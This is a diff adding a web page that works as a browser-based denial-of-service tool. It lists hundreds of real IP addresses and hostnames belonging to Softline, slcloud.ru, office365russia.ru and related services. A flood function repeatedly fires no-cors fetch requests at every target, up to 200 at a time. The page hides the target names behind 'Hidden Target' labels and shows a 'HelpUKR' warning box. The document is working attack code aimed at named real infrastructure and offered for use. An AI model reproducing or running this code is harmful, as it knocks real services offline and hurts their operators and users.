+		    'https://93.90.221.29',
+		    'https://92.246.151.76',
+		    'https://185.58.222.41',
+		    'https://tdr1.slcloud.ru',
+		    'https://proto.cbi.cloudmaster.ru',
+		    'https://185.236.211.3',
+		    'https://195.19.176.25',
+		    'https://marketing.softline.com',
+		    'https://93.90.222.72',
+		    'https://185.236.208.67',
+		    'https://185.58.221.75',
+		    'https://185.58.222.102',
+		    'https://92.246.148.241',
+		    'https://93.90.220.4',
+		    'https://185.236.211.5',
+		    'https://185.236.209.47',
+		    'https://185.58.221.178',
+		    'https://92.246.148.252',
+		    'https://92.246.149.229',
+		    'https://195.19.178.67',
+		    'https://185.58.223.105',
+		    'https://93.90.220.128',
+		    'https://195.19.176.91',
+		    'https://185.58.223.214',
+		    'https://195.19.176.62',
+		    'https://185.236.209.193',
+		    'https://185.58.223.156',
+		    'https://93.90.222.160',
+		    'https://195.19.176.155',
+		    'https://93.90.222.241',
+		    'https://185.58.223.205',
+		    'https://185.58.223.176',
+		    'https://92.246.149.250',
+		    'https://92.246.148.210',
+		    'https://92.246.151.123',
+		    'https://ex-nevaenergia-com-4.office365russia.ru',
+		    'https://92.246.149.114',
+		    'https://93.90.220.48',
+		    'https://93.90.221.32',
+		    'https://195.19.176.133',
+		    'https://185.236.208.212',
+		    'https://92.246.150.173',
+		    'https://92.246.150.176',
+		    'https://92.246.148.228',
+		    'https://92.246.149.219',
+		    'https://93.90.222.166',
+		    'https://195.19.178.25',
+		    'https://93.90.221.111',
+		    'https://185.58.220.32',
+		    'https://vo1-comm11.office365russia.ru',
+		    'https://195.19.176.197',
+		    'https://92.246.151.34',
+		    'https://185.58.223.193',
+		    'https://ex-sg-stroy-su-5.office365russia.ru',
+		    'https://inferit.cloudmaster.ru',
+		    'https://92.246.149.26',
+		    'https://195.19.178.45',
+		    'https://93.90.222.70',
+		    'https://185.236.209.194',
+		    'https://92.246.151.124',
+		    'https://92.246.148.249',
+		    'https://92.246.151.73',
+		    'https://92.246.149.21',
+		    'https://185.58.221.97',
+		    'https://93.90.220.222',
+		    'https://93.90.220.127',
+		    'https://185.58.221.199',
+		    'https://185.58.222.194',
+		    'https://panel.slcloud.ru',
+		    'https://185.58.221.82',
+		    'https://92.246.149.217',
+		    'https://93.90.222.68',
+		    'https://92.246.150.187',
+		    'https://93.90.220.22',
+		    'https://92.246.148.82',
+		    'https://195.19.176.175',
+		    'https://av.slcloud.ru',
+		    'https://93.90.220.31',
+		    'https://92.246.151.181',
+		    'https://92.246.148.211',
+		    'https://93.90.220.117',
+		    'https://185.58.223.144',
+		    'https://92.246.150.168',
+		    'https://185.58.220.56',
+		    'https://92.246.149.161',
+		    'https://start.softline.ru',
+		    'https://92.246.149.249',
+		    'https://185.58.222.101',
+		    'https://185.58.223.173',
+		    'https://92.246.149.224',
+		    'https://93.90.221.219',
+		    'https://93.90.222.66',
+		    'https://92.246.151.26',
+		    'https://185.236.209.139',
+		    'https://92.246.150.129',
+		    'https://185.58.223.163',
+		    'https://ex-braintension-com-1.office365russia.ru',
+		    'https://93.90.220.121',
+		    'https://93.90.222.140',
+		    'https://185.58.221.201',
+		    'https://outlook.slcloud.ru',
+		    'https://185.58.221.91',
+		    'https://185.58.220.170',
+		    'https://92.246.148.10',
+		    'https://185.236.209.146',
+		    'https://185.58.221.43',
+		    'https://185.236.210.34',
+		    'https://93.90.220.123',
+		    'https://vo18.slcloud.ru',
+		    'https://185.58.222.187',
+		    'https://service.softline.ru',
+		    'https://apple-stage.softline.ru',
+		    'https://195.19.178.41',
+		    'https://195.19.176.61',
+		    'https://185.58.221.100',
+		    'https://92.246.149.123',
+		    'https://185.58.223.202',
+		    'https://195.19.176.214',
+		    'https://vo14-ksmg.slcloud.ru',
+		    'https://185.236.209.147',
+		    'https://monitor.slcloud.ru',
+		    'https://helmet.softline.com',
+		    'https://185.58.223.232',
+		    'https://93.90.222.234',
+		    'https://185.236.209.83',
+		    'https://93.90.223.83',
+		    'https://195.19.176.95',
+		    'https://92.246.149.159',
+		    'https://93.90.221.10',
+		    'https://93.90.223.73',
+		    'https://mail05.softline.ru',
+		    'https://ex-braintension-com-2.office365russia.ru',
+		    'https://92.246.148.239',
+		    'https://93.90.221.220',
+		    'https://93.90.220.57',
+		    'https://www.workflowsoft.com',
+		    'https://webinars.softline.ru',
+		    'https://185.236.209.241',
+		    'https://92.246.149.183',
+		    'https://185.58.222.202',
+		    'https://185.58.223.134',
+		    'https://185.236.208.211',
+		    'https://185.58.221.231',
+		    'https://185.58.221.237',
+		    'https://185.236.210.10',
+		    'https://92.246.149.152',
+		    'https://185.58.220.218',
+		    'https://185.58.221.229',
+		    'https://185.236.209.166',
+		    'https://93.90.222.154',
+		    'https://195.19.176.121',
+		    'https://93.90.220.125',
+		    'https://92.246.149.19',
+		    'https://93.90.223.65',
+		    'https://92.246.148.251',
+		    'https://195.19.176.37',
+		    'https://oos.slcloud.ru',
+		    'https://mo.softline.ru',
+		    'https://195.19.176.236',
+		    'https://185.58.222.74',
+		    'https://185.58.221.89',
+		    'https://93.90.221.64',
+		    'https://93.90.223.251',
+		    'https://92.246.148.129',
+		    'https://vo1-as01.office365russia.ru',
+		    'https://195.19.176.9',
+		    'https://92.246.148.1',
+		    'https://185.58.221.76',
+		    'https://92.246.151.27',
+		    'https://185.236.208.50',
+		    'https://195.19.176.184',
+		    'https://195.19.176.130',
+		    'https://185.58.220.171',
+		    'https://93.90.222.82',
+		    'https://185.58.223.230',
+		    'https://185.236.208.74',
+		    'https://185.58.222.113',
+		    'https://185.58.223.209',
+		    'https://92.246.149.184',
+		    'https://92.246.149.227',
+		    'https://185.58.221.73',
+		    'https://185.58.222.27',
+		    'https://185.236.211.232',
+		    'https://92.246.148.11',
+		    'https://92.246.150.142',
+		    'https://185.58.222.33',
+		    'https://195.19.176.50',
+		    'https://195.19.176.232',
+		    'https://93.90.221.215',
+		    'https://crm.softline.com',
+		    'https://185.236.209.180',
+		    'https://93.90.222.84',
+		    'https://185.236.211.227',
+		    'https://185.236.209.149',
+		    'https://93.90.220.30',
+		    'https://185.58.221.98',
+		    'https://185.236.209.75',
+		    'https://185.236.210.35',
+		    'https://185.58.223.158',
+		    'https://m3vcd.slcloud.ru',
+		    'https://185.58.220.55',
+		    'https://92.246.151.33',
+		    'https://185.236.209.145',
+		    'https://185.236.209.44',
+		    'https://195.19.176.52',
+		    'https://92.246.150.27',
+		    'https://185.58.223.98',
+		    'https://195.19.176.209',
+		    'https://185.58.221.133',
+		    'https://jira.cloudmaster.ru',
+		    'https://vo1-r701.slcloud.ru',
+		    'https://92.246.148.246',
+		    'https://93.90.220.220',
+		    'https://195.19.176.11',
+		    'https://93.90.221.2',
+		    'https://93.90.220.61',
+		    'https://portalservices.softline.com',
+		    'https://92.246.149.85',
+		    'https://92.246.149.196',
+		    'https://93.90.220.7',
+		    'https://93.90.220.54',
+		    'https://93.90.220.181',
+		    'https://93.90.222.147',
+		    'https://195.19.176.224',
+		    'https://92.246.149.170',
+		    'https://195.19.176.126',
+		    'https://vo-mng.office365russia.ru',
+		    'https://93.90.223.209',
+		    'https://185.236.208.68',
+		    'https://185.58.223.147',
+		    'https://93.90.220.179',
+		    'https://92.246.150.147',
+		    'https://92.246.148.243',
+		    'https://92.246.149.155',
+		    'https://185.236.209.195',
+		    'https://voffice-10.office365russia.ru',
+		    'https://93.90.220.193',
+		    'https://mailgate.slcloud.ru',
+		    'https://185.236.209.42',
+		    'https://vo-r7-002.slcloud.ru',
+		    'https://185.58.223.97',
+		    'https://185.236.209.211',
+		    'https://185.58.221.132',
+		    'https://185.58.220.187',
+		    'https://mail.adecco.office365russia.ru',
+		    'https://92.246.151.178',
+		    'https://vo10-ksmg.slcloud.ru',
+		    'https://195.19.176.122',
+		    'https://93.90.223.74',
+		    'https://93.90.223.146',
+		    'https://93.90.220.46',
+		    'https://185.58.222.217',
+		    'https://93.90.223.148',
+		    'https://185.236.209.45',
+		    'https://185.58.221.185',
+		    'https://multi.slcloud.ru',
+		    'https://93.90.220.247',
+		    'https://93.90.220.209',
+		    'https://92.246.150.178',
+		    'https://185.236.211.233',
+		    'https://93.90.222.1',
+		    'https://185.58.222.140',
+		    'https://185.58.221.176',
+		    'https://185.58.221.216',
+		    'https://185.236.209.210',
+		    'https://92.246.149.185',
+		    'https://93.90.220.73',
+		    'https://185.58.222.44',
+		    'https://185.236.208.234',
+		    'https://93.90.221.214',
+		    'https://185.236.208.186',
+		    'https://185.236.209.148',
+		    'https://185.236.208.83',
+		    'https://185.58.223.83',
+		    'https://92.246.148.240',
+		    'https://92.246.151.179',
+		    'https://195.19.176.227',
+		    'https://185.236.210.65',
+		    'https://195.19.176.88',
+		    'https://92.246.149.6',
+		    'https://195.19.176.206',
+		    'https://185.236.208.233',
+		    'https://185.58.222.204',
+		    'https://92.246.150.227',
+		    'https://one.slcloud.ru',
+		    'https://92.246.149.17',
+		    'https://185.236.208.2',
+		    'https://185.58.223.107',
+		    'https://92.246.148.180',
+		    'https://rpo-mail.softline.ru',
+		    'https://naumen.softline.com',
+		    'https://185.58.221.74',
+		    'https://185.58.221.107',
+		    'https://93.90.222.98',
+		    'https://93.90.223.89',
+		    'https://185.236.211.250',
+		    'https://185.58.223.228',
+		    'https://92.246.151.68',
+		    'https://92.246.148.140',
+		    'https://web.office365russia.ru',
+		    'https://92.246.148.229',
+		    'https://92.246.150.144',
+		    'https://92.246.150.103',
+		    'https://185.58.223.231',
+		    'https://195.19.176.39',
+		    'https://195.19.176.38',
+		    'https://92.246.149.20',
+		    'https://iaas.slcloud.ru',
+		    'https://93.90.223.185',
+		    'https://93.90.222.137',
+		    'https://185.236.211.228',
+		    'https://185.58.223.188',
+		    'https://92.246.149.107',
+		    'https://93.90.220.147',
+		    'https://92.246.148.242',
+		    'https://portfolio.softline.com',
+		    'https://195.19.178.43',
+		    'https://93.90.220.75',
+		    'https://185.58.221.166',
+		    'https://geosteering-wafn01.slcloud.ru',
+		    'https://decathlon.slcloud.ru',
+		    'https://vo-r7-005.slcloud.ru',
+		    'https://195.19.176.188',
+		    'https://ex-septemcapital-ru-1.office365russia.ru',
+		    'https://92.246.151.184',
+		    'https://185.236.210.49',
+		    'https://185.58.222.83',
+		    'https://92.246.148.244',
+		    'https://93.90.220.215',
+		    'https://195.19.178.20',
+		    'https://195.19.176.204',
+		    'https://93.90.220.131',
+		    'https://92.246.150.167',
+		    'https://92.246.149.82',
+		    'https://93.90.221.216',
+		    'https://ex-kzreddon-ru-2.office365russia.ru',
+		    'https://92.246.148.248',
+		    'https://93.90.220.15',
+		    'https://93.90.222.81',
+		    'https://mc.office365russia.ru',
+		    'https://92.246.151.67',
+		    'https://ex-braintension-com-2.office365russia.ru',
+		    'https://185.236.209.34',
+		    'https://93.90.220.190',
+		    'https://92.246.149.187',
+		    'https://195.19.176.237',
+		    'https://185.58.220.201',
+		    'https://92.246.148.247',
+		    'https://92.246.149.22',
+		    'https://93.90.221.14',
+		    'https://npm.softline.ru',
+		    'https://185.236.209.46',
+		    'https://195.19.176.207',
+		    'https://ex-nevaenergia-com-2.office365russia.ru',
+		    'https://92.246.150.219',
+		    'https://93.90.222.163',
+		    'https://185.58.221.99',
+		    'https://185.58.220.225',
+		    'https://93.90.222.58',
+		    'https://lengazspetsstroy.slcloud.ru',
+		    'https://185.236.208.235',
+		    'https://93.90.222.141',
+		    'https://93.90.222.138',
+		    'https://185.236.211.6',
+		    'https://93.90.220.129',
+		    'https://93.90.220.96',
+		    'https://report.softline.com',
+		    'https://185.58.223.153',
+		    'https://93.90.222.115',
+		    'https://185.58.221.228',
+		    'https://195.19.176.100',
+		    'https://veeamccqaz.slcloud.ru',
+		    'https://92.246.149.233',
+		    'https://dito-inventory.softline.com',
+		    'https://92.246.148.89',
+		    'https://92.246.150.1',
+		    'https://185.236.209.185',
+		    'https://drive.slcloud.ru',
+		    'https://195.19.176.231',
+		    'https://185.58.221.135',
+		    'https://185.236.210.27',
+		    'https://smetaru.slcloud.ru',
+		    'https://93.90.222.75',
+		    'https://185.58.223.146',
+		    'https://conf.slcloud.ru',
+		    'https://185.236.208.1',
+		    'https://do.softlinegroup.com',
+		    'https://195.19.176.150',
+		    'https://195.19.178.36',
+		    'https://185.58.221.155',
+		    'https://dkim.office365russia.ru',
+		    'https://92.246.149.106',
+		    'https://92.246.150.224',
+		    'https://185.236.208.187',
+		    'https://195.19.176.56',
+		    'https://185.58.221.90',
+		    'https://hyd-msk.slcloud.ru',
+		    'https://wiki.softline.com',
+		    'https://92.246.149.166',
+		    'https://93.90.223.145',
+		    'https://stage.workflowsoft.com',
+		    'https://185.58.222.134',
+		    'https://185.58.222.197',
+		    'https://185.58.223.133',
+		    'https://195.19.176.182',
+		    'https://registry.slcloud.ru',
+		    'https://92.246.150.134',
+		    'https://195.19.176.235',
+		    'https://92.246.150.141',
+		    'https://185.58.223.101',
+		    'https://195.19.176.145',
+		    'https://cybers3cl01.slcloud.ru',
+		    'https://92.246.148.27',
+		    'https://92.246.148.193',
+		    'https://185.236.209.198',
+		    'https://92.246.150.155',
+		    'https://185.236.208.113',
+		    'https://185.236.208.210',
+		    'https://ex-o-zoloto-ru-4.office365russia.ru',
+		    'https://92.246.149.27',
+		    'https://92.246.150.231',
+		    'https://93.90.220.25',
+		    'https://92.246.148.227',
+		    'https://92.246.148.212',
+		    'https://185.58.221.197',
+		    'https://93.90.220.130',
+		    'https://185.58.223.114',
+		    'https://185.236.209.73',
+		    'https://185.58.221.144',
+		    'https://sip.slcloud.ru',
+		    'https://185.58.221.232',
+		    'https://185.58.220.153',
+		    'https://92.246.151.188',
+		    'https://92.246.149.84',
+		    'https://93.90.222.235',
+		    'https://92.246.151.99',
+		    'https://185.58.223.148',
+		    'https://92.246.150.143',
+		    'https://92.246.151.180',
+		    'https://92.246.149.239',
+		    'https://ex-reddon-ru-4.office365russia.ru',
+		    'https://185.58.222.82',
+		    'https://92.246.149.4',
+		    'https://92.246.148.245',
+		    'https://92.246.148.41',
+		    'https://93.90.220.126',
+		    'https://195.19.176.219',
+		    'https://185.236.208.169',
+		    'https://mail-dl.outlook.slcloud.ru',
+		    'https://dialin.slcloud.ru',
+		    'https://185.58.222.177',
+		    'https://92.246.149.117',
+		    'https://185.58.221.136',
+		    'https://195.19.178.24',
+		    'https://93.90.220.119',
+		    'https://92.246.151.241',
+		    'https://93.90.222.226',
+		    'https://93.90.222.83',
+		    'https://92.246.148.9',
+		    'https://185.58.222.209',
+		    'https://mail-ix.outlook.slcloud.ru',
+		    'https://185.58.222.195',
+		    'https://92.246.148.250',
+		    'https://veeamem.slcloud.ru',
+		    'https://92.246.149.83',
+		    'https://93.90.220.87',
+		    'https://185.236.209.65',
+		    'https://92.246.149.222',
+		    'https://92.246.151.25',
+		    'https://team.vo-r7-005.slcloud.ru',
+		    'https://92.246.149.141',
+		    'https://92.246.151.193',
+		    'https://servicedesk.softline.com',
+		    'https://93.90.220.149',
+		    'https://195.19.176.75',
+		    'https://ex-tg14-ru-4.office365russia.ru',
+		    'https://93.90.222.236',
+		    'https://93.90.222.50',
+		    'https://93.90.223.220',
+		    'https://195.19.176.208',
+		    'https://185.236.208.185',
+		    'https://185.236.208.170',
+		    'https://195.19.176.14',
+		    'https://185.58.223.223',
+		    'https://185.58.220.233',
+		    'https://93.90.222.80',
+		    'https://185.236.210.9',
+		    'https://185.58.221.152',
+		    'https://185.236.209.196',
+		    'https://93.90.221.17',
+		    'https://185.236.211.4',
+		    'https://195.19.178.40',
+		    'https://93.90.222.143',
+		    'https://93.90.223.84',
+		    'https://92.246.150.112',
+          ];
+          // initialize variables
+          var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+          var statRow = document.querySelector("#stats > .row");
+          var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+          var CONCURRENCY_LIMIT = 200;
+          var queue = [];
+          var attack = false;
+          var totalrequests = 0;
+          var totalerrors = 0;
+          function togglePause () {
+              if (attack) {
+                  attack = false;
+                  document.querySelector("div.desc .btn").innerText = "Resume";
+              } else {
+                  attack = true;
+                  document.querySelector("div.desc .btn").innerText = "Pause";
+                  for (var i=0; i<urls.length; i++) {
+                      flood(i);
+                  }
+              }
+          }
+          async function fetchWithTimeout(resource, options) {
+              const controller = new AbortController();
+              const id = setTimeout(() => controller.abort(), options.timeout);
+              return fetch(resource, {
+                  signal: controller.signal,
+                  mode: 'no-cors'
+              }).then((response) => {
+                  clearTimeout(id);
+                  return response;
+              }).catch((error) => {
+                  clearTimeout(id);
+                  throw error;
+              });
+          }
+          async function sleep(ms) {
+              return new Promise(r => setTimeout(r, ms));
+          }         
+          async function flood(n) {
+              const url = urls[n];
+              const target = targets[url];
+              while (attack) {
+                  if (queue.length > CONCURRENCY_LIMIT) {
+                      await queue.shift();
+                  }
+                  queue.push(
+                      fetchWithTimeout(url, { timeout: 2000 })
+                          .catch((error) => {
+                              if (error.code === 20 /* ABORT */) {
+                                  return;
+                              }
+                              target.number_of_errored_responses++;
+                              target.error_message = error.message;
+                              totalerrors++;
+                          })
+                          .then((response) => {
+                              if (response && !response.ok) {
+                                  target.number_of_errored_responses++;
+                                  target.error_message = response.statusText;
+                                  totalerrors++;
+                              }
+                              target.number_of_requests++;
+                          })
+                          .finally(() => updateTargetDisplay(n))
+                  );
+                  await sleep(1);
+              }
+          }
+          // Update data for target n
+          function updateTargetDisplay(n) {
+              var url = urls[n];
+              var {number_of_requests, number_of_errored_responses} = targets[url];
+              var requests_cell = document.querySelector(`#target${n} .requests`);
+              var errors_cell = document.querySelector(`#target${n} .errors`);
+              requests_cell.innerText = number_of_requests;
+              errors_cell.innerText = number_of_errored_responses;
+              document.querySelector("#totalrequests").innerText = totalrequests;
+              document.querySelector("#totalerrors").innerText = totalerrors;
+          }
+          // Shuffle array order before starting
+          for (let i = urls.length - 1; i > 0; i--) {
+              const j = Math.floor(Math.random() * (i + 1));
+              [urls[i], urls[j]] = [urls[j], urls[i]];
+          }
+          // Create div for each target
+          for (var i=0; i<urls.length; i++) {
+              statRow.innerHTML += `
+                  <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                    <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                      <table class='status'>
+                        <tr><td>requests:</td><td class="requests">0</td></tr>
+                        </tr><td>errors:</td><td class="errors">0</td></tr>
+                      </table>
+                    </div>
+              `;
+          }
+          // Show warning window
+          myModal.toggle();
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-85513613-1');
+  </script>
+  <script>
+  // BETA plugin for estimated requested data
+  (function($) {
+    $.fn.countTo = function(options) {
+      return this.each(function() {
+        //-- Arrange
+        var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+        var $el = $(this);
+        var countFrom = parseInt($el.attr('data-count-from'));
+        var countTo = parseInt($el.attr('data-count-to'));
+        var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+  
+        //-- Action
+        var rafId;
+        var increment;
+        var currentCount = countFrom;
+        var countAction = function() {              // Self looping local function via requestAnimationFrame
+          if(currentCount < countTo) {              // Perform number incremeant
+            $el.text(Math.floor(currentCount));     // Update HTML display
+            increment = countSpeed / FRAME_RATE;    // Calculate increment step
+            currentCount += increment;              // Increment counter
+            rafId = requestAnimationFrame(countAction);
+          } else {                                  // Terminate animation once it reaches the target count number
+            $el.text(countTo);                      // Set to the final value before everything stops
+            //cancelAnimationFrame(rafId);
+          }
+        };
+        rafId = requestAnimationFrame(countAction); // Initiates the looping function
+      });
+    };
+  }(jQuery));
+  
+  //-- Executing
+  $('.number-counter').countTo();
+  </script>
+  </html>
